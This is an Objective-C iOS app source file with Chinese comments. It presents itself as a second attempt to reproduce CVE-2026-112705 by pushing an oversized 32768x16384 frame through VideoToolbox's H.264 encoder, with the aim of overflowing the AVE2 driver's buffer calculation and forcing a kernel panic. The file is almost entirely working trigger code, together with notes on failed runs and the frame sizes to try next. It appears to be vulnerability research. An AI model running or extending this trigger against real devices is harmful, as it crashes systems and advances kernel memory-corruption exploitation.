//
//  vt112705b.m — CVE-2026-112705 复现 v2（去掉吃内存的 GUARD）
//
//  v1 的失败原因（已在 syslog 确认）：
//    GUARD 16384x16384 占 1 GB，TRIGGER 32768x16384 占 2 GB，
//    累计 3145559 KB = 3.15 GB，被 Jetsam 以 per-process-limit 杀掉。
//    **不是 kernel panic**，且 TRIGGER 的 Create / PixelBuffer / Prepare 全部 noErr
//    —— 说明 2 GB buffer 在这个设备上真的能分配。
//
//  v2 改动：
//    1) sanity 换成 1024x1024（4 MB），不再占 1 GB
//    2) TRIGGER 前 sleep 3 秒，让系统回收
//    3) 每步打印 phys_footprint（看清楚内存从多少涨到多少）
//    4) TRIGGER 只跑一次
//
//  预期：
//    · 若 AVE2 的 LRB 计算真的溢出 → kernel panic（dart-ave PTE-invalid write）
//    · 若仍被 Jetsam 杀 → 说明 2 GB 单独也超限，下次换 24576x16384 = 1.5 GB
//

#import <UIKit/UIKit.h>
#import <CoreFoundation/CoreFoundation.h>
#include <dlfcn.h>
#include <mach/mach.h>
#include <unistd.h>

static NSMutableString *gLog = nil;
static UITextView    *gView = nil;
static UILabel       *gStatus = nil;
static dispatch_queue_t gQ = nil;

static void L(const char *fmt, ...)
{
    va_list ap; va_start(ap, fmt);
    char buf[1024];
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    NSString *s = [NSString stringWithUTF8String:buf];
    if (!s) return;
    NSLog(@"VT112705B %@", s);
    NSString *line = [s stringByAppendingString:@"\n"];
    NSString *p = [NSTemporaryDirectory() stringByAppendingPathComponent:@"vt112705b.log"];
    FILE *f = fopen([p UTF8String], "a");
    if (f) { fprintf(f, "%s", [line UTF8String]); fclose(f); }
    dispatch_sync(dispatch_get_main_queue(), ^{
        [gLog appendString:line];
        if (gView) { gView.text = gLog; [gView scrollRangeToVisible:NSMakeRange(gLog.length,0)]; }
    });
}

static void SetStatus(NSString *s)
{
    dispatch_async(dispatch_get_main_queue(), ^{
        if (gStatus) {
            gStatus.text = s;
            gStatus.font = [UIFont monospacedSystemFontOfSize:13 weight:UIFontWeightBold];
        }
    });
}

typedef void *VTCompressionSessionRef;
typedef struct { int64_t value; int32_t timescale; uint32_t flags; int64_t epoch; } CMTime;

static const uint32_t CODEC_H264  = 0x61766331;
static const uint32_t PIXFMT_BGRA = 0x42475241;

typedef int32_t (*fn_create_t)(void *, int32_t, int32_t, uint32_t,
                               void *, void *, void *, void *, void *, VTCompressionSessionRef *);
typedef int32_t (*fn_prepare_t)(VTCompressionSessionRef);
typedef int32_t (*fn_encode_t)(VTCompressionSessionRef, CVPixelBufferRef, CMTime, CMTime,
                               void *, void *, void *);
typedef void    (*fn_inv_t)(VTCompressionSessionRef);
typedef int32_t (*fn_pbnew_t)(void *, size_t, size_t, uint32_t, void *, CVPixelBufferRef *);
typedef void    (*fn_pbfree_t)(CVPixelBufferRef);

static fn_create_t  p_create  = NULL;
static fn_prepare_t p_prepare = NULL;
static fn_encode_t  p_encode  = NULL;
static fn_inv_t     p_inv     = NULL;
static fn_pbnew_t   p_pbnew   = NULL;
static fn_pbfree_t  p_pbfree  = NULL;

static const char *st_name(int32_t st)
{
    switch (st) {
        case 0:      return "noErr";
        case -12902: return "kVTParameterErr";
        case -12903: return "kVTInvalidSessionErr";
        case -12904: return "kVTAllocationFailedErr";
        case -12908: return "kVTNotSupportedErr";
        case -6660:  return "kCVInvalidArgument";
        case -6661:  return "kCVInvalidSize";
        case -6662:  return "kCVAllocationFailed";
        case -50:    return "paramErr";
        case -108:   return "memFullErr";
        default:     return "?";
    }
}

// 当前进程物理内存占用（MB）
static double mem_mb(void)
{
    task_vm_info_data_t info;
    mach_msg_type_number_t cnt = TASK_VM_INFO_COUNT;
    if (task_info(mach_task_self(), TASK_VM_INFO, (task_info_t)&info, &cnt) != KERN_SUCCESS)
        return -1;
    return (double)info.phys_footprint / (1024.0 * 1024.0);
}

static CMTime T_zero(void) { CMTime t = {0,0,0,0}; return t; }

static void attempt(const char *tag, int32_t W, int32_t H)
{
    int64_t px = (int64_t)W * (int64_t)H;
    int64_t bytes = px * 4;
    L("");
    L("========== %s: %d x %d ==========", tag, W, H);
    L("    W*H = %lld   buffer = %.2f GB   mem_before = %.0f MB",
      (long long)px, (double)bytes / 1073741824.0, mem_mb());
    SetStatus([NSString stringWithFormat:@"%s %dx%d", tag, W, H]);

    VTCompressionSessionRef s = NULL;
    L("  [1] VTCompressionSessionCreate (H.264) ...");
    int32_t st = p_create(NULL, W, H, CODEC_H264, NULL, NULL, NULL, NULL, NULL, &s);
    L("      -> %d %s  session=%p   mem=%.0f MB", st, st_name(st), s, mem_mb());
    if (st != 0 || !s) { L("      Create 失败，中止"); return; }

    CVPixelBufferRef pb = NULL;
    L("  [2] CVPixelBufferCreate %dx%d BGRA (attributes=NULL) 需 %.2f GB ...",
      W, H, (double)bytes / 1073741824.0);
    st = p_pbnew(NULL, (size_t)W, (size_t)H, PIXFMT_BGRA, NULL, &pb);
    L("      -> %d %s  pb=%p   mem=%.0f MB", st, st_name(st), pb, mem_mb());
    if (st != 0 || !pb) {
        L("      buffer 分配失败（内存不足）");
        p_inv(s); CFRelease((CFTypeRef)s);
        return;
    }

    L("  [3] VTCompressionSessionPrepareToEncodeFrames ...");
    st = p_prepare(s);
    L("      -> %d %s   mem=%.0f MB", st, st_name(st), mem_mb());

    L("  [4] VTCompressionSessionEncodeFrame ...  <=== 触发行");
    L("      若 AVE2 按此尺寸算 LRB 且 32 位溢出，这里 kernel panic");
    CMTime z = T_zero();
    st = p_encode(s, pb, z, z, NULL, NULL, NULL);
    L("      -> %d %s   mem=%.0f MB", st, st_name(st), mem_mb());

    L("  [5] 清理 ...");
    p_pbfree(pb);
    p_inv(s);
    CFRelease((CFTypeRef)s);
    L("      mem_after = %.0f MB", mem_mb());
    L("      本次完成，没有崩溃");
}

static void run(void)
{
    L("===== CVE-2026-112705 v2（只跑 TRIGGER，省内存）=====");
    L("uid=%d pid=%d", getuid(), getpid());
    L("v1 教训：GUARD 1GB + TRIGGER 2GB = 3.15GB 被 Jetsam 杀");
    L("本轮：sanity 改成 1024x1024（4MB），TRIGGER 前 sleep 3s 让系统回收");
    L("用户内存限制参考: per-process-limit 约 3 GB");
    L("");

    void *vt = dlopen("/System/Library/Frameworks/VideoToolbox.framework/VideoToolbox", RTLD_NOW);
    void *cv = dlopen("/System/Library/Frameworks/CoreVideo.framework/CoreVideo", RTLD_NOW);
    if (!vt || !cv) { L("dlopen 失败"); SetStatus(@"加载失败"); return; }

    p_create  = (fn_create_t)dlsym(vt, "VTCompressionSessionCreate");
    p_prepare = (fn_prepare_t)dlsym(vt, "VTCompressionSessionPrepareToEncodeFrames");
    p_encode  = (fn_encode_t)dlsym(vt, "VTCompressionSessionEncodeFrame");
    p_inv     = (fn_inv_t)dlsym(vt, "VTCompressionSessionInvalidate");
    p_pbnew   = (fn_pbnew_t)dlsym(cv, "CVPixelBufferCreate");
    p_pbfree  = (fn_pbfree_t)dlsym(cv, "CVPixelBufferRelease");
    if (!p_create || !p_prepare || !p_encode || !p_pbnew) {
        L("dlsym 失败"); SetStatus(@"dlsym 失败"); return;
    }
    L("[ok] dlsym 完成   mem=%.0f MB", mem_mb());

    // ---- sanity：1024x1024，几乎不占内存，只确认路径可用 ----
    attempt("SANITY", 1024, 1024);

    // 让系统回收，避免叠加
    L("");
    L("等 3 秒让系统回收内存 ...");
    SetStatus(@"等待回收...");
    sleep(3);
    L("回收后 mem=%.0f MB", mem_mb());

    // ---- TRIGGER：只跑这一个 ----
    attempt("TRIGGER", 32768, 16384);

    L("");
    L("===== 跑完，没有崩溃 =====");
    L("  => 18.7.2 可能已修（112705 修于 26.7）");
    L("  => 或 A14 的能力表拒绝这组尺寸");
    L("  => 下一步：试 24576x16384 (1.5GB) / 32768x12000 等中间尺寸");
    SetStatus(@"完成，看日志");
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    if (!gLog) gLog = [NSMutableString new];
    if (!gQ) gQ = dispatch_queue_create("vt112705b.log", DISPATCH_QUEUE_SERIAL);

    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    self.window.backgroundColor = [UIColor blackColor];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor blackColor];

    CGFloat h = self.window.bounds.size.height;
    gStatus = [[UILabel alloc] initWithFrame:CGRectMake(8, 52, self.window.bounds.size.width - 16, 34)];
    gStatus.textAlignment = NSTextAlignmentCenter;
    gStatus.text = @"vt112705 v2...";
    gStatus.textColor = [UIColor colorWithRed:1 green:0.4 blue:0.4 alpha:1];
    gStatus.font = [UIFont monospacedSystemFontOfSize:13 weight:UIFontWeightBold];
    [vc.view addSubview:gStatus];

    gView = [[UITextView alloc] initWithFrame:CGRectMake(0, 90, self.window.bounds.size.width, h - 90)];
    gView.backgroundColor = [UIColor blackColor];
    gView.textColor = [UIColor greenColor];
    gView.font = [UIFont fontWithName:@"Menlo" size:9] ?: [UIFont systemFontOfSize:9];
    gView.editable = NO;
    [vc.view addSubview:gView];

    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        @autoreleasepool { run(); }
    });
    return YES;
}
@end

int main(int argc, char *argv[])
{
    @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); }
}
